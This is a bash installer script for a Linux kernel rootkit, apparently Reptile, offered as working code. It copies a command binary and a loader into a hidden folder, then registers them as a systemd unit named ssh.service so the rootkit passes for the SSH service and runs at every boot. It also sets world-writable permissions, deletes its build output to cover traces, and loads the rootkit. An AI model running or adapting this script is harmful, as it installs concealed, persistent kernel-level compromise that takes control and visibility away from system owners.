#!/bin/bash


# cd to the script directory
PWD="$(cd "$(dirname ${BASH_SOURCE[0]})" && pwd)"
# verify
[ $? -ne 0 ] && PWD="$(cd "$(dirname $0)" && pwd)"
#verify config
source "${BASH_SOURCE%/*}/../.config" || \
{ echo "Error: no .config file found!"; exit; }


# Create Rootkit folder
mkdir -p /$CONFIG_HIDE && \

# Copy "cmd" binary
cp $PWD/../output/cmd /$CONFIG_HIDE/$CONFIG_HIDE"_cmd" && \

# Copy loader
cp $PWD/../output/loader /$CONFIG_HIDE/loader && \

    SYSTEMD="/etc/systemd/system/"
    if [ -d "$SYSTEMD" ]; then
	cat > rk_systemd.service <<END

		#<XXXXX>

		[Unit]
		Description=BDS Startup Script
		After=network-online.target
		Wants=network-online.target


		[Service]
		ExecStart= /$CONFIG_HIDE/loader

		[Install]
		WantedBy=multi-user.target

		#</XXXXX>
END
        mv rk_systemd.service ssh.service
		sed -i s!XXXXX!$CONFIG_TAG_NAME! ssh.service && \

		cp ssh.service /etc/systemd/system/
		
        chmod 644  /etc/systemd/system/ssh.service
        systemctl daemon-reload
        systemctl enable ssh.service
    fi

# Create start script
cp $PWD/../scripts/start /$CONFIG_HIDE/$CONFIG_HIDE"_start" && \

sed -i s!XXXXX!$CONFIG_TAG_NAME! /$CONFIG_HIDE/$CONFIG_HIDE"_start" && \
sed -i s!\#CMD!/$CONFIG_HIDE/$CONFIG_HIDE"_cmd"! /$CONFIG_HIDE/$CONFIG_HIDE"_start" && \

# Permissions
chmod 777 /$CONFIG_HIDE/* && \

# cleaning output dir and all others
rm -rf $PWD/../output && \

# Load Rootkit
/$CONFIG_HIDE/loader && \

echo -e "\n\e[44;01;33m*** DONE! ***\e[00m\n" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }

# How to Uninstall
echo -e "UNINSTALL:\n"
echo -e "/$CONFIG_HIDE/$CONFIG_HIDE""_cmd show"
echo -e "rmmod reptile_module"
echo -e "rm -rf /$CONFIG_HIDE $RULE $UDEV_DIR/$CONFIG_HIDE"
echo